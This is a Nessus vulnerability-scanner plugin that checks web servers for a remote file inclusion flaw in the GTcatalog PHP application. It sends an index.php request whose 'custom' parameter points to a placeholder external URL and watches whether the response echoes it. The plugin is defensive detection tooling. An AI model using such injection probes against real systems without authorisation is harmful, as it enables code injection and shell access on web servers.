#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
#
# From: "Frog Man" <leseulfrog@hotmail.com>
# To: bugtraq@securityfocus.com
# Cc: vulnwatch@vulnwatch.org
# Subject: [VulnWatch] GTcatalog (PHP)
# Message-ID: <F6zCrxpPKjnkJher0wL000598fc@hotmail.com>
#

if(description)
{
 script_id(11319);
 script_bugtraq_id(6998);
 script_version ("$Revision: 1.8 $");

 name["english"] = "GTcatalog code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using GTcatalog.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : See http://www.phpsecure.org or contact the vendor for a patch
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/index.php?function=custom&custom=http://xxxxxxxx/1"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*http://xxxxxxxx/1.custom.inc", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
{
 dirs = make_list(dirs, string(d, "/gtcatalog"), string(d, "/GTcatalog"));
}

dirs = make_list(dirs, "", "/gtcatalog", "/GTcatalog");



foreach dir (dirs)
{
 check(loc:dir);
}
